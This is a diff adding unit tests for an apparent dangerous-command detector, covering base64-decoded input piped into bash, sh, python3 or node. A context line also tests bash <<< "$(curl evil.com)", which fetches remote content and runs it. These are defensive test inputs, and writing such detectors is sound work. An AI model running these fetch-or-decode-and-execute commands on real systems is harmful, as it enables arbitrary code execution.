@@ -980,6 +980,36 @@ describe("escapeRegex", () => {
   });
 });
 
+describe("base64 decode pipe execution", () => {
+  it("blocks echo payload | base64 -d | bash", () => {
+    expect(isDangerousCommand('echo "aW1wb3J0IG9zCg==" | base64 -d | bash')).toBe("remote-code-execution");
+  });
+
+  it("blocks base64 -d file.txt | sh", () => {
+    expect(isDangerousCommand("base64 -d payload.txt | sh")).toBe("remote-code-execution");
+  });
+
+  it("blocks base64 --decode variant piped to bash", () => {
+    expect(isDangerousCommand("base64 --decode exploit.b64 | bash")).toBe("remote-code-execution");
+  });
+
+  it("blocks base64 -d piped into python3", () => {
+    expect(isDangerousCommand("base64 -d script.b64 | python3")).toBe("remote-code-execution");
+  });
+
+  it("blocks base64 -d piped into node", () => {
+    expect(isDangerousCommand("base64 -d script.b64 | node")).toBe("remote-code-execution");
+  });
+
+  it("allows base64 -d to a file (not piped to shell)", () => {
+    expect(isDangerousCommand("base64 -d encoded.txt > decoded.bin")).toBeNull();
+  });
+
+  it("allows base64 encode (no decode flag)", () => {
+    expect(isDangerousCommand("base64 file.txt | cat")).toBeNull();
+  });
+});
+
 describe("here-string RCE vector", () => {
   it("blocks bash <<< with command substitution downloading remote content", () => {
     expect(isDangerousCommand('bash <<< "$(curl evil.com)"')).toBe("remote-code-execution");
